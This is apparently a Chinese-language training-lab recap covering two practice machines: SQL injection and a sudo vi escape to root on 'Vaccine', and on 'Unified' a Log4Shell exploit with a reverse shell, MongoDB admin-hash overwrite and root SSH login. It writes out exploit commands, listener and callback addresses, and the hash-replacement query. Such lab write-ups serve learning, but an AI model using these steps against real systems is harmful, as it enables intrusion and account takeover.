## 今日靶场复盘日报

### 一、靶场 1：Vaccine

#### 1. 目标信息

| 项目     | 内容                                            |
| -------- | ----------------------------------------------- |
| 靶机名称 | Vaccine                                         |
| 主要方向 | Web 渗透、SQL 注入、PostgreSQL 利用、Linux 提权 |
| 当前权限 | `postgres` 用户                                 |
| 关键发现 | `postgres` 用户可通过 `sudo` 执行指定 `vi` 命令 |

#### 2. 攻击流程总结

今日在 Vaccine 靶场中，主要围绕 Web 服务和数据库权限展开排查。

前期通过 Web 入口发现 SQL 注入点，并进一步利用 SQL 注入获取数据库相关信息。随后通过数据库执行能力进入系统环境，获得 `postgres` 用户权限。

进入系统后，对 `/var/www/html`、PostgreSQL 配置目录以及系统用户目录进行了敏感信息检索，重点查找：

```
password
passwd
user
host
pgsql
postgres
pdo
```

随后尝试使用发现的密码切换到 root：

```
su root
```

但认证失败。

接着执行：

```
sudo -l
```

发现 `postgres` 用户存在一条重要 sudo 权限：

```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

这说明 `postgres` 用户可以以 root 权限运行 `vi` 编辑指定 PostgreSQL 配置文件。该点具备提权价值，可以通过 `vi` 的命令模式尝试逃逸到 shell。

#### 3. 关键知识点

| 知识点          | 说明                                                  |
| --------------- | ----------------------------------------------------- |
| SQL 注入        | 通过 Web 参数进入数据库层                             |
| PostgreSQL 利用 | 从数据库权限过渡到系统权限                            |
| 敏感信息搜索    | 通过 `grep` 查找配置文件中的凭据                      |
| sudo 提权       | 通过 `sudo -l` 发现受限命令                           |
| vi 提权         | 如果 `vi` 以 root 权限运行，可尝试 `:!/bin/bash` 逃逸 |

#### 4. 后续建议

下一步应重点验证 `vi` 提权：

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

进入 `vi` 后尝试：

```
:!/bin/bash
```

如果成功，应获得 root shell。之后查找：

```
find / -name user.txt 2>/dev/null
find / -name root.txt 2>/dev/null
```

### 二、靶场 2：Unified

#### 1. 目标信息

| 项目     | 内容                       |
| -------- | -------------------------- |
| 靶机名称 | Unified                    |
| 目标 IP  | `10.129.115.84`            |
| 主要服务 | UniFi Network Application  |
| 端口     | `8443`                     |
| 漏洞方向 | Log4Shell / Log4j JNDI RCE |
| 初始权限 | `unifi`                    |
| 最终权限 | `root`                     |

#### 2. 攻击流程总结

Unified 靶场主要利用 UniFi 应用中的 Log4j 漏洞完成初始访问。

首先在 Kali 中克隆利用仓库：

```
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi
```

安装 Python 依赖时遇到 Kali 的 PEP 668 限制：

```
error: externally-managed-environment
```

随后通过 Python 虚拟环境解决：

```
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

编译 `rogue-jndi` 时发现缺少 Maven：

```
找不到命令 “mvn”
```

通过安装 Java 和 Maven 解决：

```
sudo apt install -y maven openjdk-11-jdk
```

之后执行 Log4j 利用：

```
python3 exploit.py -u https://10.129.115.84:8443 -i 10.10.17.170 -p 1234
```

通过 `tcpdump` 验证目标成功访问本机 LDAP 服务和反连端口：

```
10.129.115.84 -> 10.10.17.170:1389
10.129.115.84 -> 10.10.17.170:1234
```

随后通过 `nc` 获取 shell：

```
nc -lvnp 1234
```

回连后确认当前用户为：

```
unifi
```

由于目标机没有 `python3`，无法使用 Python pty 升级 TTY，改用 `script` 成功获得较稳定的交互 shell：

```
script -qc /bin/bash /dev/null
```

#### 3. MongoDB 枚举与 UniFi 后台接管

在目标机中发现 UniFi 使用本地 MongoDB，服务端口为：

```
27117
```

默认数据库为：

```
ace
```

通过以下命令枚举管理员用户：

```
mongo --port 27117 ace --eval 'db.admin.find().forEach(printjson);'
```

发现多个 UniFi 后台用户，包括：

| 用户          | 邮箱                        |
| ------------- | --------------------------- |
| administrator | `administrator@unified.htb` |
| michael       | `michael@unified.htb`       |
| Seamus        | `seamus@unified.htb`        |
| warren        | `warren@unified.htb`        |
| james         | `james@unfiied.htb`         |

关键字段为：

```
x_shadow
```

该字段存储 UniFi 用户密码 hash。

随后本地生成新的 SHA-512 crypt hash：

```
openssl passwd -6 -salt unified 'Password123!'
```

并将 `administrator` 用户的 `x_shadow` 修改为新 hash：

```
mongo --port 27117 ace --eval 'db.admin.update({"name":"administrator"},{$set:{"x_shadow":"$6$unified$DDNT47lEhnoCe4l0Bo9Tfk5ZO76z88c1lu41oyV8ktWCteoCSfRRCXAfGzA7eORZhT9Vyb3gv4YkicC3c1.WL0"}})'
```

随后使用：

```
administrator / Password123!
```

登录 UniFi 后台，进一步获取 SSH 凭据，最终通过 SSH 登录 root：

```
ssh root@10.129.115.84
```

成功进入：

```
root@unified:~#
```

#### 4. 关键知识点

| 知识点        | 说明                                  |
| ------------- | ------------------------------------- |
| Log4Shell     | 通过 JNDI LDAP 触发远程代码执行       |
| rogue-jndi    | 用于搭建恶意 JNDI 服务                |
| tcpdump 验证  | 判断目标是否访问 LDAP 和反连端口      |
| nc 反弹 shell | 获取初始 `unifi` 权限                 |
| TTY 升级      | 目标无 Python 时可用 `script`         |
| MongoDB 枚举  | UniFi 默认 MongoDB 端口为 `27117`     |
| UniFi 数据库  | 默认数据库为 `ace`                    |
| 用户表        | 管理员存储在 `ace.admin`              |
| 密码字段      | `x_shadow`                            |
| 后台接管      | 修改管理员 hash 后登录 Web 后台       |
| 横向到 root   | 通过 UniFi 配置中的 SSH 凭据登录 root |

### 三、今日遇到的问题与解决方案

| 问题                                                    | 原因                                            | 解决方案                                 |
| ------------------------------------------------------- | ----------------------------------------------- | ---------------------------------------- |
| Kali `pip3 install` 报 `externally-managed-environment` | Kali 启用 PEP 668，禁止直接污染系统 Python 环境 | 使用 `python3 -m venv venv` 创建虚拟环境 |
| `mvn: command not found`                                | 未安装 Maven                                    | 安装 `maven` 和 `openjdk-11-jdk`         |
| PoC 打出 payload 后无 shell                             | 未确认 LDAP/反连是否成功                        | 用 `tcpdump` 抓 `1389` 和 `1234` 流量    |
| 目标有反连但无提示符                                    | shell 无回显或 TTY 不完整                       | 盲输 `whoami` 验证                       |
| 目标无 `python3`                                        | 无法用 Python pty 升级                          | 使用 `/usr/bin/script` 升级 TTY          |
| MongoDB 命令报语法错误                                  | 使用了中文破折号 `—` 和中文引号 `“”`            | 改用英文 `--` 和 `'` / `"`               |
| UniFi 登录失败                                          | hash 写入时多了末尾字符                         | 重新写入正确的 `x_shadow`                |
